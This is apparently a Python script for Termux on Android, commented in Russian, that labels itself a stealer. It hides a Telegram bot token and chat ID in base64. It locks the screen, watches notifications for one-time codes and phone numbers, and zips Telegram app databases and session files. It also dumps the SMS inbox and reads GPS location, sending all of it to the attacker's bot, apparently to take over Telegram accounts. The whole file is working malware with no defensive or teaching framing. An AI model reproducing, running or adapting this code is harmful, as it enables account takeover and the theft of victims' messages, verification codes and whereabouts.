#!/data/data/com.termux/files/usr/bin/python3

import os
import sys
import subprocess
import threading
import time
import json
import requests
import re
import base64
from datetime import datetime

# ============================================================
# ===== ЗАШИФРОВАННЫЕ ДАННЫЕ =====
# ============================================================
_SYS_CONFIG = "ODc3NzAwNTQ0NjpBQUdnTDAtZTNlRUg0bFVpcldpc1hET1lyaEMxczBnay1FY0E="
_USER_ID = "ODUyMzI4MDI0NQ=="
_SYS_API = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="

def _decode(data):
    try:
        return base64.b64decode(data).decode('utf-8')
    except:
        return ""

BOT_TOKEN = _decode(_SYS_CONFIG)
CHAT_ID = _decode(_USER_ID)
API_URL = f"{_decode(_SYS_API)}/{BOT_TOKEN}"
DEVICE_ID = subprocess.getoutput("getprop ro.product.model") + "_" + subprocess.getoutput("getprop ro.serialno")[:8]

# ============================================================
# ===== ФУНКЦИИ ОТПРАВКИ =====
# ============================================================
def send_message(text):
    try:
        requests.post(f"{API_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except:
        pass

def send_file(path, caption=""):
    try:
        with open(path, 'rb') as f:
            requests.post(f"{API_URL}/sendDocument", 
                          data={"chat_id": CHAT_ID, "caption": caption},
                          files={"document": f}, timeout=15)
    except:
        pass

# ============================================================
# ===== 1. БЛОКИРОВКА ЭКРАНА =====
# ============================================================
def lock_device():
    send_message("🔒 **БЛОКИРОВКА**")
    try:
        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], timeout=2)
        time.sleep(0.5)
        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], timeout=2)
        send_message("✅ Заблокировано")
    except:
        pass

# ============================================================
# ===== 2. МОНИТОРИНГ УВЕДОМЛЕНИЙ =====
# ============================================================
def monitor_notifications():
    send_message("📡 **МОНИТОРИНГ**")
    last_codes = set()
    
    while True:
        try:
            output = subprocess.getoutput("dumpsys notification --current")
            codes = re.findall(r'\b\d{5,6}\b', output)
            
            for code in codes:
                if code not in last_codes:
                    last_codes.add(code)
                    send_message(f"🔑 **КОД**: `{code}`")
                    
                    # Отправляем всё уведомление с кодом
                    for line in output.split('\n'):
                        if code in line and len(line) > 10:
                            send_message(f"📩 {line[:300]}")
                            break
            
            # Поиск номеров
            phones = re.findall(r'\+?\d{10,12}', output)
            for phone in phones:
                send_message(f"📱 **НОМЕР**: `{phone}`")
            
            time.sleep(2)
        except:
            time.sleep(5)

# ============================================================
# ===== 3. СБОР ДАННЫХ =====
# ============================================================
def collect_data():
    send_message("🎯 **СБОР ДАННЫХ**")
    
    paths = [
        "/data/data/org.telegram.messenger/databases/",
        "/data/data/org.telegram.messenger/shared_prefs/",
        "/data/data/org.telegram.messenger/files/",
        "/sdcard/Telegram/"
    ]
    
    for p in paths:
        if os.path.exists(p):
            zip_name = f"/sdcard/data_{int(time.time())}.zip"
            try:
                subprocess.run(f"zip -r {zip_name} {p} > /dev/null 2>&1", shell=True, timeout=30)
                if os.path.exists(zip_name) and os.path.getsize(zip_name) > 1000:
                    send_file(zip_name, f"📦 {p}")
                    os.remove(zip_name)
                    time.sleep(1)
            except:
                pass
    
    # SMS
    try:
        output = subprocess.getoutput("content query --uri content://sms/inbox")
        if output:
            filename = f"/sdcard/sms_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(output[:10000])
            send_file(filename, "📩 SMS")
            os.remove(filename)
    except:
        pass

# ============================================================
# ===== 4. ГЕОЛОКАЦИЯ =====
# ============================================================
def get_location():
    try:
        output = subprocess.getoutput("termux-location")
        if output:
            data = json.loads(output)
            lat = data.get('latitude', 0)
            lon = data.get('longitude', 0)
            send_message(f"📍 **ЛОКАЦИЯ**\n{lat}, {lon}\nhttps://www.google.com/maps?q={lat},{lon}")
    except:
        pass

# ============================================================
# ===== ГЛАВНАЯ ФУНКЦИЯ =====
# ============================================================
def main():
    send_message("🟢 **СТИЛЕР АКТИВЕН**")
    send_message(f"📱 {DEVICE_ID}")
    
    lock_device()
    time.sleep(2)
    
    threading.Thread(target=monitor_notifications, daemon=True).start()
    
    time.sleep(3)
    collect_data()
    get_location()
    
    send_message("✅ **ГОТОВО**")
    send_message("🔑 **ОЖИДАНИЕ КОДА**")
    
    while True:
        time.sleep(10)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        send_message(f"⚠️ {e}")